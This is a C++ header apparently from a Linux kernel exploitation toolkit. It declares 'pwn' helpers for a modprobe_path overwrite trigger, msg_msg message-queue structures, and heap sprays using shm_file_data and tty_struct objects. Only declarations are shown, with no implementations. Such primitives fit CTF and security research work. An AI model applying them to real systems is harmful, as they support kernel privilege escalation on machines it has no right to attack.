#ifndef __EXP_H__
#define __EXP_H__

// msg_msg
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>

// shm_file_data
#include <sys/ipc.h>
#include <sys/shm.h>

// tty_struct
// open
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

// spdlog
#include <spdlog/spdlog.h>

namespace pwn
{

    void win();

    namespace modprobe_path
    {
        void init(std::string modprobe_path, std::string dummy_file, std::string win_bin);
        void trigger(std::string dummy_file, std::string win_bin);
    }

    namespace msg_msg
    {
        // msg_msg structs
        typedef struct
        {
            long mtype;
            char mtext[1];
        } msg;

        typedef struct
        {
            void *ll_next;
            void *ll_prev;
            long m_type;
            size_t m_ts;
            void *next;
            void *security;
        } msg_header;

        int32_t make_queue(key_t key, int msgflg);

        void get_msg(int msqid, void *msgp, size_t msgsz, long msgtyp, int msgflg);

        void send_msg(int msqid, void *msgp, size_t msgsz, int msgflg);
    }

    namespace kmalloc_32
    {
        namespace shm_file_data
        {
            void spray(size_t num_of_spray);
        }
    }

    namespace kmalloc_1024
    {
        namespace tty_struct
        {
            std::vector<int> spray(size_t num_of_spray);
        }
    }
}
#endif